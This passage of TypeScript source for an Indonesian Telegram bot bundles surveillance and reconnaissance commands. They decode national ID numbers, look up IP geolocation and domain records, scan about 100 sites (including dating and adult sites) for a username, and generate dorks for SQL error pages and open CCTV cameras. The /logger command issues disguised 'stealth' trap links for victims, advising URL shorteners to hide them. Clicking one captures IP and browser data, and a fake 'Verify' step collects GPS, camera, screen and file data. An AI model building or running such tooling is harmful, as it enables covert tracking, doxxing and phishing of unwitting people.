        let thn = parseInt(nik.substring(10, 12), 10);
        const urut = nik.substring(12, 16);

        let jk = "Laki-laki 👨";
        if (tgl >= 40) {
          jk = "Perempuan 👩";
          tgl -= 40;
        }
        const currentYear = new Date().getFullYear() % 100;
        thn = thn > currentYear ? 1900 + thn : 2000 + thn;

        const reply = `<b>🇮🇩 DATA NIK DECODER</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `📋 <b>NIK:</b> <code>${nik}</code>\n` +
                      `👤 <b>Gender:</b> ${jk}\n` +
                      `📅 <b>Lahir:</b> <code>${tgl.toString().padStart(2, '0')}-${bln}-${thn}</code>\n` +
                      `📍 <b>Wilayah:</b>\n` +
                      `├ Provinsi: ${provMap[prov] || "Tidak diketahui"}\n` +
                      `├ Kode Kab: ${kab}\n` +
                      `└ Kode Kec: ${kec}\n` +
                      `🔢 <b>No Urut:</b> ${urut}\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `✅ <i>Analisis selesai (Sederhana).</i>`;

        ctx.reply(reply, { parse_mode: 'HTML' });
      }
    });

    bot.command('plat', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format salah. Contoh: /plat B 1234 ABC atau /plat B1234ABC");
      
      const platInput = args.slice(1).join('').toUpperCase();
      const match = platInput.match(/^([A-Z]{1,2})(\d{1,4})([A-Z]{0,3})$/);
      
      if (!match) return ctx.reply("❌ Format plat nomor tidak valid.");
      
      const platMap: Record<string, string> = { "A": "Banten", "B": "DKI Jakarta, Depok, Tangerang, Bekasi", "D": "Bandung, Cimahi", "E": "Cirebon, Indramayu, Majalengka, Kuningan", "F": "Bogor, Sukabumi, Cianjur", "T": "Purwakarta, Karawang, Subang", "Z": "Garut, Tasikmalaya, Sumedang, Ciamis, Banjar", "G": "Pekalongan, Tegal, Brebes, Batang, Pemalang", "H": "Semarang", "DN": "Sulawesi Tengah", "DT": "Sulawesi Tenggara", "DD": "Makassar, Gowa, Maros", "DP": "Parepare, Palopo, Luwu", "DC": "Sulawesi Barat", "PA": "Papua", "PB": "Papua Barat", "BL": "Aceh", "BB": "Sumut (Barat)", "BK": "Sumut (Timur)/Medan", "BA": "Sumatera Barat", "BM": "Riau", "BP": "Kepulauan Riau", "BG": "Sumatera Selatan", "BN": "Bangka Belitung", "BE": "Lampung", "BD": "Bengkulu", "BH": "Jambi" };

      const kodeWilayah = match[1];
      const angka = match[2];
      const kodeDetail = match[3];

      const wilayah = platMap[kodeWilayah] || "Wilayah tidak terdaftar";

      const reply = `━━━━━ ᴘʟᴀᴛ ᴀɴᴀʟʏᴢᴇʀ ━━━━━\n\n` +
                    `🔢 <b>ᴘʟᴀᴛ :</b> <code>${kodeWilayah} ${angka} ${kodeDetail}</code>\n\n` +
                    `📍 <b>ᴡɪʟᴀʏᴀʜ :</b> ${wilayah}\n\n` +
                    `├ ᴋᴏᴅᴇ ᴀʀᴇᴀ : ${kodeWilayah}\n` +
                    `├ ɴᴏ ᴘᴏʟɪꜱɪ : ${angka}\n` +
                    `└ ᴅᴇᴛᴀɪʟ/ꜱᴜʙ : ${kodeDetail || '-'}\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <i>ᴀɴᴀʟɪꜱɪꜱ ꜱᴇʟᴇꜱᴀɪ.</i>`;

      ctx.reply(reply, { parse_mode: 'HTML' });
    });

    bot.command('sethost', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length > 1) {
        let newHost = args[1];
        if (!newHost.startsWith('http')) newHost = 'https://' + newHost;
        appHost = newHost;
        await ctx.reply(`✅ <b>System Host diubah manual ke:</b>\n<code>${appHost}</code>\n\nCoba jalankan /logger kembali.`, {parse_mode: 'HTML'});
        
        const isLocal = appHost.includes('localhost') || appHost.includes('127.0.0.1');
        if (!isLocal && webhookPath && bot) {
          try {
            const webhookUrl = `${appHost.replace(/\/$/, '')}${webhookPath}`;
            await bot.telegram.setWebhook(webhookUrl);
            await ctx.reply(`🌐 <b>Webhook Synced!</b>\nNew endpoint set.`, {parse_mode: 'HTML'});
          } catch (e: any) {
            await ctx.reply(`❌ <b>Failed to sync Webhook:</b>\n${e.message}`, {parse_mode: 'HTML'});
          }
        }
      } else {
        ctx.reply(`ℹ️ <b>Host saat ini:</b>\n<code>${appHost}</code>\n\nJika link IP Logger error (problem loading page/localhost/404), gunakan perintah:\n<code>/sethost https://URL_WEB_ANDA</code>\nAtau pastikan web app Anda sedang online.`, {parse_mode: 'HTML'});
      }
    });

    bot.command('logger', (ctx) => {
      const id = generateTrapId(ctx.chat.id);
      
      let replyMessage = `🎣 <b>STEALTH LINK GENERATED</b>\n` +
                         `━━━━━━━━━━━━━━━━━━━━\n` +
                         `Silakan pilih template link yang sesuai dengan target Anda:\n\n`;
      
      Object.entries(templates).forEach(([key, tmpl]) => {
        const trapUrl = `${appHost.replace(/\/$/, '')}/t/${key}/${id}`;
        replyMessage += `<b>${tmpl.name}</b>\n🔗 <code>${trapUrl}</code>\n\n`;
      });
      
      replyMessage += `━━━━━━━━━━━━━━━━━━━━\n` +
                      `💡 <b>CARA KERJA:</b>\n` +
                      `1. Kirim link di atas ke target.\n` +
                      `2. Saat diklik, IP & Browser akan terdeteksi.\n` +
                      `3. Jika target klik button "Verify", data <b>Advanced Module</b> (GPS, Cam-ID, Screen, Files) akan terkirim.\n\n` +
                      `⚠️ <i>Tips: Gunakan shortener (bit.ly/tinyurl) agar link terlihat lebih profesional.</i>`;
      
      ctx.reply(replyMessage, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('ip', async (ctx) => {
      const args = ctx.message.text.split(' ');
      const ip = args.length > 1 ? args[1] : '';
      let url = `http://ip-api.com/json/${ip}?fields=status,message,continent,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query`;
      
      try {
        const response = await fetch(url);
        const data = await response.json();
        if (data.status === 'success') {
          const mapLink = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
          let reply = `<b>🌐 TARGET IP ANALYTICS PRO</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `💎 <b>IP QUERY:</b> <code>${data.query}</code>\n\n` +
                      `🏢 <b>NETWORK & INFRA:</b>\n` +
                      `├ ISP: ${data.isp || '-'}\n` +
                      `├ ORG: ${data.org || '-'}\n` +
                      `├ ASN: ${data.as || '-'} (${data.asname || '-'}) \n` +
                      `└ REVERSE: ${data.reverse || '-'}\n\n` +
                      `📍 <b>LOKASI REGIONAL:</b>\n` +
                      `├ BENUA: ${data.continent || '-'}\n` +
                      `├ NEGARA: ${data.country || '-'} (${data.countryCode || '-'}) \n` +
                      `├ REGION: ${data.regionName || '-'}\n` +
                      `├ KOTA/DISTRIK: ${data.city || '-'} / ${data.district || '-'}\n` +
                      `├ KODEPOS: ${data.zip || '-'}\n` +
                      `└ ZONA WAKTU: ${data.timezone || '-'} (GMT${data.offset/3600})\n\n` +
                      `🌎 <b>SPATIAL & MAPS:</b>\n` +
                      `├ COORD: <code>${data.lat || '-'}, ${data.lon || '-'}</code>\n` +
                      `└ GMAPS: <a href="${mapLink}">Lihat Titik BTS</a>\n\n` +
                      `🛡️ <b>RISK DETECTIONS:</b>\n` +
                      `├ JARINGAN SELULER (4G/5G): ${data.mobile ? '✅ YA' : '❌ TIDAK'}\n` +
                      `├ PROXY/VPN DETEKSI: ${data.proxy ? '⚠️ TERBURUK/VPN DETECTED' : '✅ BERSIH'}\n` +
                      `└ KOMPUTER SERVER (CLOUD): ${data.hosting ? '⚠️ DATA CENTER' : '✅ RESIDENTIAL/HOME'}\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `⚠️ <i>Info: Geolocation IP mengacu pada titik BTS provider pusat terdekat, bukan koordinat GPS pasti perangkat. Gunakan Logger Link untuk pelacakan fisik.</i>`;
          ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
        } else {
          ctx.reply("❌ Gagal mendapatkan informasi IP.");
        }
      } catch (e) {
        ctx.reply("❌ Terjadi kesalahan sistem saat mengecek IP.");
      }
    });

    bot.command('whois', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format salah. Contoh: /whois google.com");
      const domain = args[1].replace(/https?:\/\//, '').replace(/\/$/, '');
      
      try {
        ctx.reply(`🔍 Sedang menganalisis detail registrar WHOIS untuk <b>${domain}</b>...`, { parse_mode: 'HTML' });
        const res = await fetch(`https://networkcalc.com/api/dns/whois/${domain}`);
        const data = await res.json();
        if (data.status === 'OK' && data.whois) {
          let txt = `🌐 <b>WHOIS DATA ANALYTICS</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>DOMAIN:</b> <code>${domain}</code>\n\n` +
                    `📝 <b>REGISTRAR INFO:</b>\n` +
                    `└ Name: ${data.whois.registrar || '-'}\n\n` +
                    `📆 <b>DATES:</b>\n` +
                    `├ CREATED: ${data.whois.creation_date || '-'}\n` +
                    `├ UPDATED: ${data.whois.updated_date || '-'}\n` +
                    `└ EXPIRED: ${data.whois.expiration_date || '-'}\n\n` +
                    `📡 <b>NAME SERVERS:</b>\n` +
                    (data.whois.name_servers || []).map((ns:any)=>`├ <code>${ns}</code>`).join('\n').replace(/├$/, '└') +
                    `\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <i>Query WHOIS berhasil.</i>`;
          ctx.reply(txt, {parse_mode: 'HTML'});
        } else {
          ctx.reply(`❌ Whois data tidak ditemukan untuk <code>${domain}</code>. (Pastikan format domain benar tanpa https://)`, {parse_mode: 'HTML'});
        }
      } catch (e) {
        ctx.reply("❌ Terjadi kesalahan sistem saat mengecek Whois.");
      }
    });

    bot.command('dns', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format salah. Contoh: /dns google.com");
      const domain = args[1].replace(/https?:\/\//, '').replace(/\/$/, '');
      
      try {
        ctx.reply(`📡 Menarik data DNS Records & Routing IP untuk <b>${domain}</b> via Cloudflare/Google DoH...`, { parse_mode: 'HTML' });
        
        const fetchDns = async (type: string) => {
           try {
               const res = await fetch(`https://dns.google/resolve?name=${domain}&type=${type}`);
               const data = await res.json();
               return data.Answer || [];
           } catch { return []; }
        };

        const [a, aaaa, mx, txt, cname, ns] = await Promise.all([
           fetchDns('A'), fetchDns('AAAA'), fetchDns('MX'), fetchDns('TXT'), fetchDns('CNAME'), fetchDns('NS')
        ]);

        let txtOutput = `<b>📡 DNS MAPPING PRO</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `💎 <b>DOMAIN:</b> <code>${domain}</code>\n\n`;
        
        if (a.length > 0) txtOutput += `<b>[+] A RECORDS :</b>\n` + a.map((r:any) => `├ <code>${r.data}</code>`).join('\n') + '\n\n';
        if (aaaa.length > 0) txtOutput += `<b>[+] AAAA RECORDS :</b>\n` + aaaa.map((r:any) => `├ <code>${r.data}</code>`).join('\n') + '\n\n';
        if (mx.length > 0) txtOutput += `<b>[+] MX RECORDS :</b>\n` + mx.map((r:any) => `├ <code>${r.data}</code>`).join('\n') + '\n\n';
        if (ns.length > 0) txtOutput += `<b>[+] NS (NAME SERVERS) :</b>\n` + ns.map((r:any) => `├ <code>${r.data}</code>`).join('\n') + '\n\n';
        if (txt.length > 0) txtOutput += `<b>[+] TXT RECORDS :</b>\n` + txt.map((r:any) => `├ <code>${r.data}</code>`).join('\n') + '\n\n';
        if (cname.length > 0) txtOutput += `<b>[+] CNAME RECORDS :</b>\n` + cname.map((r:any) => `├ <code>${r.data}</code>`).join('\n') + '\n\n';

        txtOutput += `━━━━━━━━━━━━━━━━━━━━\n` + `✅ <i>DoH Query Selesai.</i>`;
        
        if(txtOutput.length > 4000) txtOutput = txtOutput.substring(0, 3950) + "\n\n... (Terpotong limit)";
        if(a.length === 0 && ns.length === 0) return ctx.reply("❌ Data DNS tidak ditemukan.");
        ctx.reply(txtOutput, {parse_mode: 'HTML'});
      } catch (e: any) {
        ctx.reply(`❌ Terjadi kesalahan sistem (DoH server gagal): ${e.message}`);
      }
    });

    bot.command('domain', (ctx) => ctx.reply("Gunakan /whois [domain] atau /dns [domain]"));

    bot.command('email', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2 || !args[1].includes('@')) return ctx.reply("Format salah. Contoh: /email target@example.com");
      const email = args[1];
      
      try {
        const domain = email.split("@")[1];
        const records = await resolveMx(domain);
        if (records && records.length > 0) {
          const reply = `<b>📧 EMAIL MX VALIDATOR</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `🎯 <b>TARGET:</b> <code>${email}</code>\n` +
                        `🌐 <b>DOMAIN:</b> <code>${domain}</code>\n\n` +
                        `✅ STATUS:<b> AKTIF Menerima Email</b>\n\n` +
                        `📋 <b>MX RECORDS:</b>\n` +
                        records.map((r, idx) => `${idx === records.length - 1 ? '└' : '├'} [Pri: ${r.priority}] ${r.exchange}`).join('\n') +
                        `\n━━━━━━━━━━━━━━━━━━━━`;
          ctx.reply(reply, { parse_mode: 'HTML' });
        } else {
          ctx.reply(`❌ Tidak ditemukan MX records untuk domain ${domain}.`);
        }
      } catch (e) {
        ctx.reply(`❌ Format valid, tapi kami tidak bisa memverifikasi MX records (domain mungkin tidak aktif atau memblokir pengecekan).`);
      }
    });

    bot.command('username', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("❌ <b>Format salah.</b>\nContoh: <code>/username targetnya</code>", { parse_mode: 'HTML' });
      
      const rawInput = args.slice(1).join('').toLowerCase();
      const username = rawInput.replace(/[^a-z0-9_.-]/g, '');
      if (!username) return ctx.reply("❌ <b>Username tidak valid.</b>", { parse_mode: 'HTML' });
      
      ctx.reply(`🔍 Memindai jejak digital untuk <b>@${username}</b>...\n<i>Mengecek puluhan platform...</i>`, { parse_mode: 'HTML' });
      
      const platforms = [
        // Global Social Media & Tech (~100 Platforms)
        { name: "GitHub", url: `https://github.com/${username}` },
        { name: "Twitter", url: `https://twitter.com/${username}` },
        { name: "Instagram", url: `https://www.instagram.com/${username}/` },
        { name: "TikTok", url: `https://www.tiktok.com/@${username}` },
        { name: "YouTube", url: `https://www.youtube.com/@${username}` },
        { name: "Facebook", url: `https://www.facebook.com/${username}` },
        { name: "Pinterest", url: `https://www.pinterest.com/${username}` },
        { name: "Reddit", url: `https://www.reddit.com/user/${username}` },
        { name: "Tumblr", url: `https://${username}.tumblr.com` },
        { name: "Medium", url: `https://medium.com/@${username}` },
        { name: "Vimeo", url: `https://vimeo.com/${username}` },
        { name: "SoundCloud", url: `https://soundcloud.com/${username}` },
        { name: "Spotify", url: `https://open.spotify.com/user/${username}` },
        { name: "Twitch", url: `https://www.twitch.tv/${username}` },
        { name: "Steam", url: `https://steamcommunity.com/id/${username}` },
        { name: "Flickr", url: `https://www.flickr.com/people/${username}` },
        { name: "Patreon", url: `https://www.patreon.com/${username}` },
        { name: "Dev.to", url: `https://dev.to/${username}` },
        { name: "Wattpad", url: `https://www.wattpad.com/user/${username}` },
        { name: "VK", url: `https://vk.com/${username}` },
        { name: "GitLab", url: `https://gitlab.com/${username}` },
        { name: "Linktree", url: `https://linktr.ee/${username}` },
        { name: "Dribbble", url: `https://dribbble.com/${username}` },
        { name: "Behance", url: `https://www.behance.net/${username}` },
        { name: "About.me", url: `https://about.me/${username}` },
        { name: "Fiverr", url: `https://www.fiverr.com/${username}` },
        { name: "Gumroad", url: `https://gumroad.com/${username}` },
        { name: "Quora", url: `https://www.quora.com/profile/${username}` },
        { name: "Telegram", url: `https://t.me/${username}` },
        { name: "CodePen", url: `https://codepen.io/${username}` },
        { name: "HackerRank", url: `https://www.hackerrank.com/${username}` },
        { name: "LeetCode", url: `https://leetcode.com/${username}` },
        { name: "Kaggle", url: `https://www.kaggle.com/${username}` },
        { name: "Pastebin", url: `https://pastebin.com/u/${username}` },
        { name: "ProductHunt", url: `https://www.producthunt.com/@${username}` },
        { name: "Slack", url: `https://${username}.slack.com` },
        { name: "Trello", url: `https://trello.com/${username}` },
        { name: "Bandcamp", url: `https://bandcamp.com/${username}` },
        { name: "Last.fm", url: `https://www.last.fm/user/${username}` },
        { name: "ReverbNation", url: `https://www.reverbnation.com/${username}` },
        { name: "Letterboxd", url: `https://letterboxd.com/${username}` },
        { name: "MyAnimeList", url: `https://myanimelist.net/profile/${username}` },
        { name: "Goodreads", url: `https://www.goodreads.com/${username}` },
        { name: "Strava", url: `https://www.strava.com/athletes/${username}` },
        { name: "TripAdvisor", url: `https://www.tripadvisor.com/members/${username}` },
        { name: "Roblox", url: `https://www.roblox.com/user.aspx?username=${username}` },
        { name: "Minecraft", url: `https://namemc.com/profile/${username}` },
        { name: "Chess.com", url: `https://www.chess.com/member/${username}` },
        { name: "Lichess", url: `https://lichess.org/@/${username}` },
        { name: "eBay", url: `https://www.ebay.com/usr/${username}` },
        { name: "HubPages", url: `https://hubpages.com/@${username}` },
        { name: "Instructables", url: `https://www.instructables.com/member/${username}` },
        { name: "DailyMotion", url: `https://www.dailymotion.com/${username}` },
        { name: "Giphy", url: `https://giphy.com/channel/${username}` },
        { name: "Imgur", url: `https://imgur.com/user/${username}` },
        { name: "Bugcrowd", url: `https://bugcrowd.com/${username}` },
        { name: "HackerOne", url: `https://hackerone.com/${username}` },
        { name: "BuyMeACoffee", url: `https://www.buymeacoffee.com/${username}` },
        { name: "Ko-fi", url: `https://ko-fi.com/${username}` },
        { name: "Snapchat", url: `https://www.snapchat.com/add/${username}` },
        { name: "OkCupid", url: `https://www.okcupid.com/profile/${username}` },
        { name: "Bumble", url: `https://bumble.com/app/profile/${username}` },
        { name: "Tinder", url: `https://tinder.com/@${username}` },
        { name: "VSCO", url: `https://vsco.co/${username}` },
        { name: "Foursquare", url: `https://foursquare.com/${username}` },
        { name: "DeviantArt", url: `https://www.deviantart.com/${username}` },
        { name: "Mixcloud", url: `https://www.mixcloud.com/${username}/` },
        { name: "PornHub", url: `https://www.pornhub.com/users/${username}` },
        { name: "Xvideos", url: `https://www.xvideos.com/profiles/${username}` },
        { name: "OnlyFans", url: `https://onlyfans.com/${username}` },
        { name: "Fansly", url: `https://fansly.com/${username}` },
        { name: "CashApp", url: `https://cash.app/$${username}` },
        { name: "Venmo", url: `https://venmo.com/${username}` },
        { name: "Paypal", url: `https://www.paypal.com/paypalme/${username}` },
        { name: "Skype", url: `https://web.skype.com/share?url=${username}` },
        { name: "Interpals", url: `https://www.interpals.net/${username}` },
        { name: "Couchsurfing", url: `https://www.couchsurfing.com/people/${username}` },
        { name: "Duolingo", url: `https://www.duolingo.com/profile/${username}` },
        { name: "Discord", url: `https://discord.id/user/${username}` },
        { name: "Bitbucket", url: `https://bitbucket.org/${username}/` },
        { name: "AngelList", url: `https://angel.co/u/${username}` },
        { name: "Houzz", url: `https://www.houzz.com/user/${username}` },
        { name: "Polygon", url: `https://www.polygon.com/users/${username}` },
        { name: "Vicky", url: `https://www.viki.com/users/${username}/about` },
        { name: "Crunchyroll", url: `https://www.crunchyroll.com/user/${username}` },
        { name: "BandLab", url: `https://www.bandlab.com/${username}` },
        { name: "Canva", url: `https://www.canva.com/${username}` },
        { name: "Adobe", url: `https://www.behance.net/${username}` },
        { name: "SlideShare", url: `https://www.slideshare.net/${username}` },
        { name: "Issuu", url: `https://issuu.com/${username}` },
        { name: "Scribd", url: `https://www.scribd.com/${username}` },
        // Indo & SE Asia Platforms (Focus User Request)
        { name: "Kaskus", url: `https://www.kaskus.co.id/profile/${username}` },
        { name: "Kompasiana", url: `https://www.kompasiana.com/${username}` },
        { name: "Blogger", url: `https://${username}.blogspot.com` },
        { name: "WordPress", url: `https://${username}.wordpress.com` },
        { name: "MobileLegends", url: `https://m.mobilelegends.com/en/search/user?keyword=${username}` },
        { name: "Detik", url: `https://news.detik.com/search?query=${username}` },
        { name: "Kaskus Jual Beli", url: `https://www.kaskus.co.id/fjb/user/${username}` },
        { name: "Bukalapak", url: `https://www.bukalapak.com/u/${username}` },
        { name: "Tokopedia", url: `https://www.tokopedia.com/people/${username}` },
        { name: "Traveloka", url: `https://www.traveloka.com/en-id/user/${username}` },
        { name: "Kulina", url: `https://kulina.id/@${username}` },
        { name: "Bstation", url: `https://www.bilibili.tv/en/space/${username}` },
        { name: "Shopee", url: `https://shopee.co.id/${username}` }
      ];

      // Platforms known to return soft 404s (200 OK but page says not found) or block bots aggressively.
      // We will flag these as "Proteksi/Perlu Cek Manual" to improve accuracy instead of falsely claiming "DITEMUKAN".
      const soft404Platforms = ['Instagram', 'TikTok', 'YouTube', 'Facebook', 'Twitter', 'Snapchat', 'Tinder', 'Bumble', 'OkCupid', 'Spotify'];

      // To avoid overwhelming constraints, process in chunks or concurrently
      const results = await Promise.all(platforms.map(async (platform) => {
        try {
          // Increase accuracy: actually fetch text for some, but fallback to status to avoid huge payload
          const response = await fetchWithTimeout(platform.url, { 
            method: "HEAD",
            headers: {
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
              "Accept": "text/html,application/xhtml+xml"
            }
          }, 4500); // 4.5 seconds timeout
          
          let found = false;
          let status = response.status;
          
          if (status === 200 || status === 301 || status === 302) {
            found = true;
          }

          if (soft404Platforms.includes(platform.name)) {
            // Force these to be manual check / protested because HEAD requests on these almost always yield false positives
            found = false; 
            status = 403; // Simulate blocked
          }

          return { name: platform.name, found, status, url: platform.url };
        } catch (err) {
          return { name: platform.name, found: false, status: "error", url: platform.url };
        }
      }));

      const foundList = results.filter(r => r.found);
      const blockedList = results.filter(r => r.status === 403 || r.status === 429);
      const notFoundList = results.filter(r => !r.found && r.status !== 403 && r.status !== 429);

      let replyText = `<b>🎯 DIGITAL FOOTPRINT ANALYSIS: @${username}</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n\n`;
      
      if (foundList.length > 0) {
        replyText += `🟢 <b>DITEMUKAN (${foundList.length} PLATFORM)</b>\n`;
        foundList.forEach(r => replyText += `├ <a href="${r.url}">${r.name}</a>\n`);
        replyText = replyText.replace(/\n├ (<a href="[^"]+">[^<]+<\/a>)\n$/, "\n└ $1\n"); // Fix last icon
      }

      if (blockedList.length > 0) {
        replyText += `\n🟡 <b>PROTECTED / MANUAL CHECK (${blockedList.length})</b>\n`;
        blockedList.forEach(r => replyText += `├ <a href="${r.url}">${r.name}</a> ⚠️\n`);
        replyText = replyText.replace(/\n├ (<a href="[^"]+">[^<]+<\/a> ⚠️)\n$/, "\n└ $1\n");
      }

      replyText += `\n❌ <b>TIDAK DITEMUKAN (${notFoundList.length} PLATFORM)</b>\n`;
      if (notFoundList.length > 0) {
        replyText += `└ <i>Antara lain: ${notFoundList.map(r => r.name).slice(0, 5).join(', ')}...</i>\n`;
      }
      
      replyText += `━━━━━━━━━━━━━━━━━━━━\n` +
                   `✅ <i>Digital footprint scan complete.</i>`;

      ctx.reply(replyText, { link_preview_options: { is_disabled: true }, parse_mode: 'HTML' });
    });

    bot.command('mac', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /mac [MAC_ADDRESS]");
      try {
        const res = await fetch(`https://api.macvendors.com/${args[1]}`);
        if(res.status === 200) {
          const vendor = await res.text();
          const reply = `<b>🔌 MAC VENDOR LOOKUP</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `🆔 <b>MAC:</b> <code>${args[1]}</code>\n` +
                        `🏢 <b>VENDOR:</b> <code>${vendor}</code>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `✅ <i>Query data berhasil.</i>`;
          ctx.reply(reply, { parse_mode: 'HTML' });
        } else {
          ctx.reply("❌ Tidak ditemukan vendor (atau rate limited).");
        }
      } catch (e) { ctx.reply("❌ Error fetching MAC info."); }
    });

    bot.command('headers', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /headers [url]");
      let url = args[1];
      if(!url.startsWith('http')) url = 'http://' + url;
      try {
        const res = await fetchWithTimeout(url, { method: 'HEAD' }, 4000);
        let hdrs = '';
        res.headers.forEach((v, k) => hdrs += `├ ${k}: ${v}\n`);
        const reply = `<b>🛡️ HTTP SECURITY HEADERS</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `💎 <b>TARGET:</b> <code>${url}</code>\n\n` +
                      `📋 <b>HEADERS DATA:</b>\n` +
                      `<pre>${hdrs.substring(0,3800)}</pre>` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, { parse_mode: 'HTML' });
      } catch (e) { ctx.reply("❌ Error fetching headers."); }
    });

    bot.command('dork', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /dork [keyword]");
      const q = encodeURIComponent(args);
      const reply = `<b>🔍 GOOGLE DORKS GENERATOR</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>KEYWORD:</b> <code>${args}</code>\n\n` +
                    `├ 📦 <b>Listing:</b> <a href="https://www.google.com/search?q=intitle:%22index+of%22+${q}">Cek Direktori</a>\n` +
                    `├ 📄 <b>Files:</b> <a href="https://www.google.com/search?q=${q}+filetype:pdf+OR+filetype:doc">Cari Dokumen</a>\n` +
                    `├ 👤 <b>Login:</b> <a href="https://www.google.com/search?q=inurl:login+${q}">Cari Form Login</a>\n` +
                    `├ 🐞 <b>SQL:</b> <a href="https://www.google.com/search?q=${q}+%22sql+syntax%22">SQL Error Dork</a>\n` +
                    `└ 🎥 <b>CCTV:</b> <a href="https://www.google.com/search?q=inurl:view/view.shtml+${q}">Cari Open Camera</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <i>Dorking links generated.</i>`;
      ctx.reply(reply, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('bininfo', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /bininfo [BIN]");
      try {
        const res = await fetch(`https://data.handyapi.com/bin/${args[1]}`);
        const data = await res.json();
        if(data && data.Status === 'SUCCESS') {
          const reply = `<b>💳 CREDIT CARD BIN INFO</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `💎 <b>BIN:</b> <code>${args[1]}</code>\n\n` +
                        `├ 📂 TYPE: ${data.Scheme} (${data.Type})\n` +
                        `├ 🔝 TIER: ${data.CardTier}\n` +
                        `├ 📍 NEGARA: ${data.Country.Name}\n` +
                        `└ 🏦 BANK: ${data.Issuer}\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `✅ <i>Query BIN berhasil.</i>`;
          ctx.reply(reply, { parse_mode: 'HTML' });
        } else {
          ctx.reply("❌ Data BIN tidak ditemukan.");
        }
      } catch(e) { ctx.reply("❌ Gagal mengecek BIN."); }
    });

    bot.command('subdomain', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /subdomain [domain.com]");
      let domain = args[1].replace(/^https?:\/\//, '').replace(/^www\./, '');
      try {
        ctx.reply(`🔍 Menggali data SSL/TLS topology untuk <b>${domain}</b> (Stealth crt.sh mode)...\nMohon tunggu.`, {parse_mode: 'HTML'});
        const res = await fetchWithTimeout(`https://crt.sh/?q=%.${domain}&output=json`, {}, 25000);
        const data = await res.json();
        
        let subdomains = new Set<string>();
        data.forEach((entry: any) => {
           if (entry.name_value) {
               entry.name_value.split('\n').forEach((sub: string) => {
                   let cleanSub = sub.trim().toLowerCase();
                   if (!cleanSub.includes('*')) subdomains.add(cleanSub);
               });
           }
        });

        const subs = Array.from(subdomains).slice(0, 40);

        if(subs.length > 0) {
          const reply = `<b>🌐 SUBDOMAIN RECON MAPPING (STEALTH)</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `💎 <b>TARGET:</b> <code>${domain}</code>\n\n` +
                        `📋 <b>FOUND SUBS (Top 40):</b>\n` +
                        subs.map((s, idx) => `${idx === subs.length - 1 ? '└' : '├'} <code>${s}</code>`).join('\n') +
                        `\n━━━━━━━━━━━━━━━━━━━━\n` +
                        `✅ <i>Reconnaissance selesai. ${subdomains.size > 40 ? `(Ditemukan total ${subdomains.size} subs)` : ''}</i>`;
          ctx.reply(reply, {parse_mode: 'HTML'});
        } else { ctx.reply("❌ Tidak ada subdomain ditemukan dalam database certificate transparency."); }
      } catch(e: any) { 
        ctx.reply(`❌ Gagal mencari subdomain.\n<code>${e.message}</code>`, {parse_mode: 'HTML'}); 
      }
    });

    bot.command('reverseip', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /reverseip [IP_atau_Domain]");
      let target = args[1];
      try {
        ctx.reply(`🔍 Sedang menganalisa Reverse IP Lookup untuk <b>${target}</b>...`, {parse_mode: 'HTML'});
        const res = await fetchWithTimeout(`https://api.hackertarget.com/reverseiplookup/?q=${target}`, {}, 15000);
        const text = await res.text();
        if (text.includes('error') || text.includes('API count exceeded')) throw new Error(text);
        const lines = text.split('\n').filter(l => l.trim().length > 0);
        if(lines.length > 0) {
          const reply = `<b>🕸️ REVERSE IP LOOKUP</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `💎 <b>TARGET:</b> <code>${target}</code>\n\n` +
                        `📋 <b>FOUND DOMAINS:</b>\n` +
                        lines.slice(0, 30).map((s, idx, arr) => `${idx === arr.length - 1 ? '└' : '├'} <code>${s}</code>`).join('\n') +
                        `\n━━━━━━━━━━━━━━━━━━━━\n` +
